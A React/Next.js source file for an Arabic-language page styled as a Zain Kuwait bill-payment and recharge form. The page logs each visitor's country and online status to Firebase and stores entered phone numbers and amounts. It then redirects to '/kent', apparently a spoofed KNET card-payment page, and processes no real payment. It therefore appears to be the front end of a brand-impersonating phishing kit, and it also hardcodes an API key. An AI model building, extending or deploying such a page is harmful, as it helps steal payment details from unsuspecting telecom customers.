"use client"

import React,{ useState, useEffect, useCallback } from "react"
import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2 } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
// Assuming these are correctly set up in your project
 import { addData } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
import LoaderApp from "@/components/loader"

// Placeholder functions to avoid errors if lib files are not present


const visitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`;


export default function ZainPaymentForm() {
  const [phone, setPhone] = useState("")
  const [paymentType, setPaymentType] = useState("other")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [amount, setAmount] = useState('6.00')
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
  const [phoneError, setPhoneError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [activeTab, setActiveTab] = useState("bill")

  useEffect(() => {
   getLocationAndLog()
  }, []);

  useEffect(() => {
    localStorage.setItem("amount",amount);
  }, [amount]);



  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
    } else {
      setPhoneError("")
    }
  }, [phone])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    if (value.length <= 8) {
      setPhone(value)
    }
  }

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem("amount", value) // Consider if this is necessary or should be component state only
    setAmount((value))
  }

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, [visitorId, getLocationAndLog]);

  const handleSubmit = async (e:any) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      await addData({
        id: visitorId,
        phone: phone, // Storing phone number, ensure compliance with privacy regulations
        amount: amount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت ",
        action: "payment_submit_attempt"
            }).then(()=>{
      window.location.href = "/kent"; // Replace with Next.js router if possible: router.push('/checkout')

            })

      // Simulate API call for payment processing
      
      // On successful payment simulation
  
      // Navigate to checkout or show success
      // For Next.js, prefer using the `useRouter` hook for navigation
    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error)
      });
      // Handle error display to user
    } finally {
      setIsLoading(false)
    }
  }

  const isFormValid = phone.length === 8 &&  parseInt(amount) > 0

  const billAmounts = ["5", "10", "15", "20", "30", "50"]
  const rechargeAmounts = ["2", "5", "10", "15", "20", "30"]
  const currentAmounts = activeTab === "bill" ? billAmounts : rechargeAmounts;

  const renderAmountSelection = () => (
    phone.length === 8 && !phoneError && (
      <div className="space-y-3">
        <Label className="text-sm font-medium text-slate-800">
          {activeTab === "bill" ? "اختر مبلغ الفاتورة" : "اختر باقة إعادة التعبئة"}
        </Label>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
          {currentAmounts.map((value) => (
            <Button
              key={value}
              type="button"
              variant={selectedAmount === value ? "default" : "outline"}
              className={`h-auto py-3 px-2 text-base font-semibold transition-all duration-200 rounded-lg shadow-sm hover:shadow-md focus-visible:ring-2 focus-visible:ring-primary focus-visible:ring-offset-2
                ${selectedAmount === value
                  ? "bg-primary text-primary-foreground scale-105 ring-2 ring-primary ring-offset-1"
                  : "border-slate-300 hover:border-primary hover:bg-primary/10 text-slate-700"
                }`}
              onClick={() => handleAmountSelect(value)}
            >
              <div className="text-center w-full">
                <div className="font-bold text-lg">{value}.000</div>
                <div className="text-xs opacity-90">د.ك</div>
              </div>
            </Button>
          ))}
        </div>
      </div>
    )
  );
 
  const renderPhoneNumberInput = () => (
    <div className="space-y-2">
      <Label className="text-sm font-medium text-slate-800 flex items-center justify-between">
        <span>رقم الهاتف</span>
        <Badge variant="outline" className="text-xs font-normal border-primary/50 text-primary">مطلوب</Badge>
      </Label>
      <div className="relative">
        <Input
          type="tel"
          placeholder="XXXXXXXX"
          value={phone}
          onChange={handlePhoneChange}
          maxLength={8}
          className={`h-12 text-lg font-mono bg-white border-slate-300 focus:border-primary focus:ring-1 focus:ring-primary transition-colors placeholder:text-slate-400 text-right
            ${phoneError ? "border-red-500 focus:border-red-500 focus:ring-red-500" : "border-slate-300"}
            ${phone.length === 8 && !phoneError ? "border-green-500 focus:border-green-500 focus:ring-green-500" : ""}`}
          dir="rtl" // Keep ltr for phone number input
        />
        {phone.length === 8 && !phoneError && (
          <CheckCircle2 className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
        )}
         {phoneError && phone.length > 0 && (
            <AlertCircle className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
        )}
      </div>
      {phoneError && (
        <div className="flex items-center gap-2 text-xs text-red-600 pt-1">
          <AlertCircle className="w-4 h-4 flex-shrink-0" />
          <p>{phoneError}</p>
        </div>
      )}
    </div>
  );

  const renderTermsAndConditions = (idPrefix: string) => (
     <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
      <div className="flex items-start gap-3">
        <Checkbox
          id={`${idPrefix}-terms`}
          checked={termsAccepted}
          onCheckedChange={(checked) => setTermsAccepted(checked as boolean)}
          className="mt-0.5 data-[state=checked]:bg-primary data-[state=checked]:border-primary border-slate-400"
          aria-labelledby={`${idPrefix}-terms-label`}
        />
        <div className="grid gap-1.5 leading-none">
          <Label
            htmlFor={`${idPrefix}-terms`}
            id={`${idPrefix}-terms-label`}
            className="text-sm font-medium cursor-pointer text-slate-700 hover:text-primary transition-colors"
          >
            أوافق على الشروط والأحكام
          </Label>
          <p className="text-xs text-slate-500">
            بالمتابعة، أنت توافق على شروط وأحكام الخدمة الخاصة بنا.
          </p>
        </div>
      </div>
    </div>
  );

  return (
    <>
     <header className="bg-gradient-to-l from-[#2b224d] to-[#1e1236] p-2 flex justify-between items-center shadow-md relative my-4 ">
     
     <div className="absolute right-0 left-0 flex justify-center pointer-events-none">
       <img src="/top.png" className="object-contain" />
     </div>
   </header>
    <form dir="rtl" onSubmit={handleSubmit} className="min-h-screen bg-white text-black p-4">
    <div className="max-w-md mx-auto bg-white rounded-xl shadow-md p-4" dir="rtl">
      <div className="flex justify-around border-b pb-2 mb-4">
        <button type="button" onClick={()=>setActiveTab('bill')} className={activeTab==="bill"?"text-pink-600 font-bold":"text-gray-600"}>دفع الفاتورة</button>
        <button type="button" onClick={()=>setActiveTab('ess')}  className={activeTab==="ess"?"text-pink-600 font-bold":"text-gray-600"}>إعادة تعبئة eeZee</button>

      </div>

      <h2 className="text-lg font-bold mb-2">أود أن أعيد التعبئة لـ</h2>

      <div className="mb-4">
        {renderPhoneNumberInput()}
      </div>

      <div className="mb-4">
        <label className="block mb-1 text-gray-700">مبلغ التعبئة</label>
        <select
          className="w-full border border-gray-300 rounded p-2"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
        >
          <option value="6.000">6.000 د.ك (30 يوم)</option>
          <option value="10.000">10.000 د.ك (60 يوم)</option>
          <option value="15.000">15.000 د.ك (90 يوم)</option>
          <option value="30.000">30.000 د.ك (120 يوم)</option>
          <option value="40.000">40.000 د.ك (150 يوم)</option>
          <option value="50.000">50.000 د.ك (200 يوم)</option>
        </select>
      </div>

      <div className="text-center mb-4">
        <button className=" text-gray-600 py-2 px-4 rounded w-full" disabled>
          + أضف رقم آخر
        </button>
      </div>

      <hr className="my-4" />

      <div className="flex justify-between text-xl font-bold text-green-600 mb-4">
      <span className="text-black">إجمالي</span>
      
        <span>{amount}د.ك</span>
      </div>

      <button disabled={!isFormValid} className={isFormValid?"bg-rose-600 text-white py-2 px-4 rounded w-full" :"bg-gray-300 text-gray-600 py-2 px-4 rounded w-full" }>
        أعد التعبئة الآن
      </button>
    </div>
    {isLoading&&<LoaderApp/>}

  </form>
  </>



  )
}